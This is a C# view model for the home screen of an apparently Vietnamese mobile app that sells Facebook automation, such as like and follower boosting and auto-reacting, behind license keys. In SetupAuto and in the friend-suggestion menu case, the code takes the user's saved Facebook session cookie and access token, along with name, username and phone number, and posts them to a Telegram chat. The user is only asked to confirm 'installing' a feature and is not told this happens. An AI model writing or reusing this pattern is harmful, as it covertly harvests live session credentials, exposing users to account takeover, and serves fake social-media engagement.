using AUTO.HLT.MOBILE.VIP.Configurations;
using AUTO.HLT.MOBILE.VIP.Controls.ConnectFacebook;
using AUTO.HLT.MOBILE.VIP.Models.Home;
using AUTO.HLT.MOBILE.VIP.Models.LicenseKey;
using AUTO.HLT.MOBILE.VIP.Models.Login;
using AUTO.HLT.MOBILE.VIP.Models.Telegram;
using AUTO.HLT.MOBILE.VIP.Services.Database;
using AUTO.HLT.MOBILE.VIP.Services.Facebook;
using AUTO.HLT.MOBILE.VIP.Services.LicenseKey;
using AUTO.HLT.MOBILE.VIP.Services.Telegram;
using AUTO.HLT.MOBILE.VIP.Services.VersionApp;
using AUTO.HLT.MOBILE.VIP.Views.ChangePassword;
using AUTO.HLT.MOBILE.VIP.Views.Feature;
using AUTO.HLT.MOBILE.VIP.Views.FilterFriend;
using AUTO.HLT.MOBILE.VIP.Views.HappyBirthday;
using AUTO.HLT.MOBILE.VIP.Views.Home;
using AUTO.HLT.MOBILE.VIP.Views.KeyGeneration;
using AUTO.HLT.MOBILE.VIP.Views.Manage;
using AUTO.HLT.MOBILE.VIP.Views.Pokes;
using AUTO.HLT.MOBILE.VIP.Views.SuportCustumer;
using Microsoft.AppCenter.Crashes;
using Newtonsoft.Json;
using Prism.Navigation;
using Prism.Services;
using Prism.Services.Dialogs;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Input;
using Xamarin.CommunityToolkit.ObjectModel;
using Xamarin.Essentials;
using Xamarin.Forms;

namespace AUTO.HLT.MOBILE.VIP.ViewModels.Home
{
    public class HomeViewModel : ViewModelBase
    {
        private LoginModel _infoUser;
        private IDatabaseService _databaseService;
        private IPageDialogService _pageDialogService;
        private View _licenseView;
        private ILicenseKeyService _licenseKeyService;
        private LicenseKeyModel _licenseKey;
        private bool _isLoading;
        private IDialogService _dialogService;
        private IFacebookService _facebookService;
        private ITelegramService _telegramService;
        private ObservableCollection<ItemMenuModel> _listItemMenus;
        private IVersionAppService _versionAppService;

        public ObservableCollection<ItemMenuModel> ListItemMenus
        {
            get => _listItemMenus;
            set => SetProperty(ref _listItemMenus, value);
        }

        public LoginModel InfoUser
        {
            get => _infoUser;
            set => SetProperty(ref _infoUser, value);
        }
        public ICommand LogoutCommant { get; private set; }

        public View LicenseView
        {
            get => _licenseView;
            set => SetProperty(ref _licenseView, value);
        }

        public ICommand UpgradeAccountCommand { get; private set; }

        public LicenseKeyModel LicenseKey
        {
            get => _licenseKey;
            set => SetProperty(ref _licenseKey, value);
        }

        public string Key { get; set; }

        public bool IsLoading
        {
            get => _isLoading;
            set => SetProperty(ref _isLoading, value);
        }

        public ICommand ConnectFacebookCommand { get; private set; }
        public ICommand UseFeatureCommand { get; private set; }

        public HomeViewModel(INavigationService navigationService, IDatabaseService databaseService, IPageDialogService pageDialogService, ILicenseKeyService licenseKeyService, IDialogService dialogService, IFacebookService facebookService, ITelegramService telegramService, IVersionAppService versionAppService) : base(navigationService)
        {
            _versionAppService = versionAppService;
            _telegramService = telegramService;
            _facebookService = facebookService;
            _dialogService = dialogService;
            _licenseKeyService = licenseKeyService;
            _pageDialogService = pageDialogService;
            _databaseService = databaseService;
            LogoutCommant = new AsyncCommand(Logout);
            UpgradeAccountCommand = new AsyncCommand<string>(UpgradeAccount);
            ConnectFacebookCommand = new AsyncCommand(ConnectFacebook);
            UseFeatureCommand = new AsyncCommand<ItemMenuModel>(UseFeature);
        }

        private async void CheckVerionApplication()
        {
            try
            {
                var data = await _versionAppService.CheckVersionApp();
                if (data != null && data.Code > 0 && data.Data != null)
                {
                    var version = data.Data;
                    var sotreUri = version.Note.Split(';');
                    var build = int.Parse(VersionTracking.CurrentBuild);
                    if (version.Version > build)
                    {
                        Device.BeginInvokeOnMainThread(async () =>
                        {
                            await _pageDialogService.DisplayAlertAsync("Thông báo",
                                "Đã có phiên bản mới, vui lòng cập nhật để sử dụng tính năng ổn định nhất",
                                "Cập nhật ngay");
                            if (DeviceInfo.Platform == DevicePlatform.Android)
                            {
                                await Browser.OpenAsync(sotreUri[0], BrowserLaunchMode.SystemPreferred);
                            }
                            else if (DeviceInfo.Platform == DevicePlatform.iOS)
                            {
                                await Browser.OpenAsync(sotreUri[1], BrowserLaunchMode.SystemPreferred);
                            }
                        });
                    }
                }
            }
            catch (Exception e)
            {
                Crashes.TrackError(e);
            }
        }

        private async Task UseFeature(ItemMenuModel item)
        {
            if (IsLoading || item == null) return;
            IsLoading = true;
            var id = item.Id;
            switch (id)
            {
                case 1:
                case 2:
                    var para = new NavigationParameters();
                    para.Add("TypeFeature", item);
                    await NavigationService.NavigateAsync(nameof(FeaturePage), para);
                    break;
                case 3:
                case 7:
                    await SetupAuto(item);
                    break;
                case 5:
                    await NavigationService.NavigateAsync(nameof(PokesPage));
                    break;
                case 4:
                    await NavigationService.NavigateAsync(nameof(FilterFriendPage));
                    break;
                case 8:
                    await NavigationService.NavigateAsync(nameof(SuportCustumerPage));
                    break;
                case 6:
                    await NavigationService.NavigateAsync(nameof(HappyBirthdayPage));
                    break;
                case 9:
                    await NavigationService.NavigateAsync(nameof(ManagePage));
                    break;
                case 10:
                    await NavigationService.NavigateAsync(nameof(KeyGenerationPage));
                    break;
                case 11:
                    await NavigationService.NavigateAsync(nameof(ChangePasswordPage));
                    break;
                case 12:
                    if (_licenseKey != null)
                    {
                        var infoFace =
                            await _facebookService.GetInfoUser();
                        if (infoFace != null && infoFace.name != null)
                        {
                            if (await _pageDialogService.DisplayAlertAsync("Thông báo",
                                $"Bạn muốn kết bạn theo gợi ý cho tài khoản facebook {infoFace?.name}", "Cài ngay",
                                "Thôi"))
                            {
                                var user = await _databaseService.GetAccountUser();
                                var content = new ContentSendTelegramModel()
                                {
                                    Ten_Thong_Bao = item?.TitleItem,
                                    So_Luong = 1,
                                    Id_Nguoi_Dung = user?.ID,
                                    Ghi_Chu = new
                                    {
                                        Ten = user?.Name,
                                        Tai_Khoan = user?.UserName,
                                        So_dien_thoai = user?.NumberPhone,
                                        Id_facebook = infoFace?.id,
                                        Ten_facebook = infoFace?.name,
                                        Avatar_facebook = infoFace?.picture?.data?.url,
                                        Ngay_Het_Han = _licenseKey.EndDate,
                                        So_Ngay_Con_Lai = _licenseKey.CountEndDate
                                    },
                                    Noi_Dung_Thong_Bao = new
                                    {
                                        Cookie = Preferences.Get(AppConstants.CookieFacebook, ""),
                                        Token = Preferences.Get(AppConstants.TokenFaceook, ""),
                                    }
                                };
                                var send = await _telegramService.SendMessageToTelegram(AppConstants.IdChatWork,
                                    JsonConvert.SerializeObject(content, Formatting.Indented));
                                if (send != null && send.ok)
                                {
                                    await _pageDialogService.DisplayAlertAsync("Thông báo", "Cài đặt thành công", "OK");
                                }
                                else
                                {
                                    await _pageDialogService.DisplayAlertAsync("Thông báo",
                                        "Lỗi phát sinh bạn vui lòng cài lại hoặc liên hệ admin để được hỗ trợ", "OK");
                                }
                            }
                        }
                    }
                    break;
                default:
                    break;
            }
            IsLoading = false;
        }
        /// <summary>
        /// Tu dong tha tim avatar ban be
        /// </summary>
        /// <param name="item"></param>
        /// <returns></returns>
        private async Task SetupAuto(ItemMenuModel item)
        {
            try
            {
                if (_licenseKey != null)
                {
                    if (await _facebookService.CheckCookieAndToken())
                    {
                        var infoFace =
                            await _facebookService.GetInfoUser();
                        if (infoFace != null && infoFace.name != null)
                        {
                            if (await _pageDialogService.DisplayAlertAsync("Thông báo",
                                $"Bạn muốn cài tự động cho tài khoản facebook {infoFace?.name}", "Cài ngay",
                                "Thôi"))
                            {
                                var user = await _databaseService.GetAccountUser();
                                var content = new ContentSendTelegramModel()
                                {
                                    Ten_Thong_Bao = item?.TitleItem,
                                    So_Luong = 1,
                                    Id_Nguoi_Dung = user?.ID,
                                    Ghi_Chu = new
                                    {
                                        Ten = user?.Name,
                                        Tai_Khoan = user?.UserName,
                                        So_dien_thoai = user?.NumberPhone,
                                        Id_facebook = infoFace?.id,
                                        Ten_facebook = infoFace?.name,
                                        Avatar_facebook = infoFace?.picture?.data?.url,
                                        Ngay_Het_Han = _licenseKey.EndDate,
                                        So_Ngay_Con_Lai = _licenseKey.CountEndDate
                                    },
                                    Noi_Dung_Thong_Bao = new
                                    {
                                        Cookie = Preferences.Get(AppConstants.CookieFacebook, ""),
                                        Token = Preferences.Get(AppConstants.TokenFaceook, ""),
                                    }
                                };
                                var send = await _telegramService.SendMessageToTelegram(AppConstants.IdChatWork,
                                        JsonConvert.SerializeObject(content, Formatting.Indented));
                                if (send != null && send.ok)
                                {
                                    await _pageDialogService.DisplayAlertAsync("Thông báo", "Cài đặt thành công", "OK");
                                }
                                else
                                {
                                    await _pageDialogService.DisplayAlertAsync("Thông báo", "Lỗi phát sinh bạn vui lòng cài lại hoặc liên hệ admin để được hỗ trợ", "OK");
                                }
                            }

                        }
                    }
                    else
                    {
                        if (await _pageDialogService.DisplayAlertAsync("Thông báo", "Để sử dụng tính năng này bạn cần kết nối với tài khoản facebook của mình", "Kết nối ngay", "Thôi"))
                        {
                            await _dialogService.ShowDialogAsync(nameof(ConnectFacebookDialog));
                            await SetupAuto(item);
                        }
                    }
                }
                else
                {
                    await _pageDialogService.DisplayAlertAsync("Thông báo",
                        "Bạn nên nâng cấp tài khoản để sử dụng đầy đủ tính năng", "OK");
                }
            }
            catch (Exception e)
            {
                Crashes.TrackError(e);
            }
        }
        /// <summary>
        /// ket noi facebook
        /// </summary>
        /// <returns></returns>
        private async Task ConnectFacebook()
        {
            if (IsLoading)
                return;
            IsLoading = true;
            await _dialogService.ShowDialogAsync(nameof(ConnectFacebookDialog));
            IsLoading = false;
        }
        /// <summary>
        /// nang cap tai khoan
        /// </summary>
        /// <param name="arg"></param>
        /// <returns></returns>
        private async Task UpgradeAccount(string arg)
        {
            try
            {
                if (IsLoading)
                    return;
                IsLoading = true;
                switch (arg)
                {
                    case "0":
                        LicenseView = new AddLicenseKeyView();
                        break;
                    case "1":
                        if (Key != null)
                        {
                            if (await _licenseKeyService.ActiveLiceseKey(Key))
                            {
                                await _pageDialogService.DisplayAlertAsync("Thông báo",
                                    "Kích hoạt khóa thành công", "OK");
                                await CheckLicenseKey();
                                var usr = await _databaseService.GetAccountUser();
                                var messager = JsonConvert.SerializeObject(new ContentSendTelegramModel()
                                {
                                    Ten_Thong_Bao = "Nâng cấp tài khoản",
                                    Id_Nguoi_Dung = usr.ID,
                                    Noi_Dung_Thong_Bao = new
                                    {
                                        Khoa_Ban_Quyen = LicenseKey.LicenseKey,
                                        Kich_Hoat_Ngay = LicenseKey.DateActive,
                                        Ngay_Het_Han = LicenseKey.EndDate,
                                        So_Ngay_Con_Lai = LicenseKey.CountEndDate
                                    },
                                    So_Luong = 1,
                                    Ghi_Chu = new
                                    {
                                        Ten = usr.Name,
                                        Tai_Khoan = usr.UserName,
                                        So_dien_thoai = usr.NumberPhone
                                    }
                                }, Formatting.Indented);
                                await _telegramService.SendMessageToTelegram(AppConstants.IdChatTelegramNoti,
                                    messager);
                            }
                            else
                            {
                                await _pageDialogService.DisplayAlertAsync("Thông báo",
                                    "Kích hoạt khóa chưa thành công", "OK");
                            }
                        }
                        else
                        {
                            await _pageDialogService.DisplayAlertAsync("Thông báo",
                                "Bạn vui lòng điền đầy đủ thông tin", "OK");
                        }

                        break;
                    case "2":
                        LicenseView = new FreeView();
                        break;
                    default:
                        break;
                }
            }
            catch (Exception e)
            {
                Crashes.TrackError(e);
            }
            finally
            {
                IsLoading = false;
            }
        }

        public override async void OnNavigatedTo(INavigationParameters parameters)
        {
            base.OnNavigatedTo(parameters);
            IsLoading = true;
            await CheckLicenseKey();
            InfoUser = await _databaseService.GetAccountUser();

            ListItemMenus = new ObservableCollection<ItemMenuModel>(GetItemMenu());
            if (InfoUser.Role != 2)
            {
                ListItemMenus.Add(new ItemMenuModel
                {
                    BgColor = Color.FromHex("#6930c3"),
                    Id = 9,
                    Role = 98,
                    Icon = "icon_manager.png",
                    TitleItem = "Quản lý",
                });
                if (InfoUser.Role == 0)
                {
                    ListItemMenus.Add(new ItemMenuModel
                    {
                        BgColor = Color.FromHex("#9fd8df"),
                        Id = 10,
                        Role = 97,
                        Icon = "icon_key_generation.png",
                        TitleItem = "Cài đặt",
                    });
                }
            }
            new Thread(CheckVerionApplication).Start();
            IsLoading = false;
        }

        private async Task CheckLicenseKey()
        {
            LicenseKey = await _licenseKeyService.CheckLicenseForUser();
            if (LicenseKey != null)
            {
                LicenseView = new VipView();
            }
            else
            {
                LicenseView = new FreeView();
            }
        }

        private async Task Logout()
        {
            if (IsLoading) return;
            IsLoading = true;
            if (await _pageDialogService.DisplayAlertAsync("Thông báo", "Bạn muốn đăng xuất tài khoản",
                "Ok", "Cancel"))
            {
                await _databaseService.DeleteAccontUser();
                Preferences.Clear(AppConstants.SavePasswd);
                await NavigationService.NavigateAsync("/LoginPage", null, false, true);
            }

            IsLoading = false;
        }

        private List<ItemMenuModel> GetItemMenu()
        {
            return new List<ItemMenuModel>
            {
                new ItemMenuModel()
                {
                    Id = 1,
                    TitleItem = "Tăng like bài viết",
                    Role = 99,
                    BgColor = Color.FromHex("e40017"),
                    Icon = "icon_like.png"
                },
                new ItemMenuModel()
                {
                    Id = 2,
                    TitleItem = "Tăng lượt theo dõi",
                    Role = 99,
                    BgColor = Color.FromHex("8ac4d0"),
                    Icon = "icon_follow.png"
                },
                new ItemMenuModel()
                {
                    Id = 3,
                    TitleItem = "Tự động thả tim",
                    Role = 99,
                    BgColor = Color.FromHex("f0a500"),
                    Icon = "icon_auto_boot_hear.png"
                },
                new ItemMenuModel()
                {
                    Id = 4,
                    TitleItem = "Lọc bạn bè",
                    Role = 99,
                    BgColor = Color.FromHex("6ddccf"),
                    Icon = "icon_filter_friends.png"
                },
                new ItemMenuModel()
                {
                    Id = 5,
                    TitleItem = "Chọc bạn bè",
                    Role = 99,
                    BgColor = Color.FromHex("383e56"),
                    Icon = "icon_pokes.png"
                },
                new ItemMenuModel()
                {
                    Id = 6,
                    TitleItem = "Chúc mừng sinh nhật bạn bè",
                    Role = 99,
                    BgColor = Color.FromHex("161d6f"),
                    Icon = "icon_birthday.png"
                },
                new ItemMenuModel()
                {
                    Id = 7,
                    TitleItem = "Tự động tương tác avatar",
                    Role = 99,
                    BgColor = Color.FromHex("6930c3"),
                    Icon = "icon_Interactive.png"
                },
                new ItemMenuModel()
                {
                    Id = 12,
                    TitleItem = "Kết bạn theo gợi ý",
                    Role = 99,
                    BgColor = Color.FromHex("233e8b"),
                    Icon = "icon_add_friend.png"
                },
                new ItemMenuModel()
                {
                    Id = 11,
                    TitleItem = "Đổi mật khẩu",
                    Role = 99,
                    BgColor = Color.FromHex("eca3f5"),
                    Icon = "icon_change_password.png"
                },
                new ItemMenuModel()
                {
                    Id = 8,
                    TitleItem = "Hỗ trợ",
                    Role = 99,
                    BgColor = Color.FromHex("ff4b5c"),
                    Icon = "icon_customer_support.png"
                }
            };
        }
    }
}